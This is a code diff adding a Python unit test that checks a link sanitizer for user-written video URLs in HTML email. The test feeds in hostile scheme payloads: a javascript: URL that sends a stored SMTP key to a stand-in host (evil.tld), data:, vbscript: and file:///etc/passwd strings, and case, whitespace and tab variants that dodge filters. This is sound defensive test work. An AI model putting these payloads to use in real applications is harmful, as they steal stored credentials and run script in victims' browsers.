@@ -66,6 +66,35 @@ def test_sin_sitio_no_se_inventan_enlaces():
     assert e.landing("es") == "" and e.banner("es") == "" and e.video("es") == ""
 
 
+def test_un_enlace_que_no_sea_http_no_entra_al_mensaje():
+    """La URL del video la escribe el usuario y va derecho al `href` del
+    correo y de la pantalla de Correos. `escape()` tapa las comillas pero no
+    el ESQUEMA: un `javascript:` pasaba entero hasta el enlace, y el HTML del
+    correo se previsualiza en un iframe que hereda el origen de la app —
+    donde viven las claves de SMTP, del modelo, de X y de LinkedIn."""
+    from cliente_ia import enlaces as menlaces
+
+    venenos = [
+        "javascript:fetch('https://evil.tld/?'+localStorage.getItem('mvcliente_smtp'))",
+        "JavaScript:alert(1)",                 # el esquema no distingue mayúsculas
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+        "file:///etc/passwd",
+        "  javascript:alert(1)",               # con espacios delante
+        "java\tscript:alert(1)",               # partido con un tabulador
+    ]
+    for malo in venenos:
+        e = menlaces.desde_dict({"sitio": "https://ejemplo.com",
+                                 "videos": {"es": malo}})
+        assert e.videos == {}, malo
+        assert e.video("es") == "", malo
+
+    # Y un video de verdad sigue pasando igual que siempre.
+    bueno = menlaces.desde_dict({"sitio": "https://ejemplo.com",
+                                 "videos": {"es": "https://youtu.be/abc123"}})
+    assert bueno.video("es") == "https://youtu.be/abc123"
+
+
 # ---------------------------------------------------------------------------
 # Correo HTML
 # ---------------------------------------------------------------------------
